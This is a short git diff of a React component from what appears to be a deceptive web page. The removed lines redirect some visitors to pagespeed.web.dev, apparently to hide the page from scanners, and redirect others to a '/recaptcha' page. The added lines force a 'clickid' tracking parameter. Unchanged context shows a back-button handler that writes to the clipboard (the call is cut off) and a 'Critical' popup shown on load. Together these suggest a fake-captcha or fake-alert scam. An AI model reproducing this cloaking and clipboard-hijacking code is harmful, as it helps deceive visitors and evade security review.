@@ -3,22 +3,16 @@ import Critical from "../Critical/Critical";
 import Header from "./Header/Header";
 import { useTranslation } from "react-i18next";
 
-const params = new Proxy(new URLSearchParams(window.location.search), {
-  get: (searchParams, prop) => searchParams.get(prop),
-});
-
-if (!params.verified && localStorage.getItem("redirecta")) {
-  window.location.replace("https://pagespeed.web.dev/");
-}
 const Main = () => {
   const num = useRef(0);
   const [isOpen, setIsOpen] = useState("true");
   const params = new Proxy(new URLSearchParams(window.location.search), {
     get: (searchParams, prop) => searchParams.get(prop),
   });
-  if (!params.verified) {
-    window.location.replace("/recaptcha");
+  if (!params.clickid) {
+    window.location.search = "?clickid=1";
   }
+
   const { i18n } = useTranslation();
   const handlePopstate = () => {
     window.navigator.clipboard
@@ -50,7 +44,6 @@ const Main = () => {
     };
   }, []);
 
-  useEffect(() => {}, []);
   return (
     <div className="App">
       {isOpen ? <Critical setIsOpen={setIsOpen} /> : null}
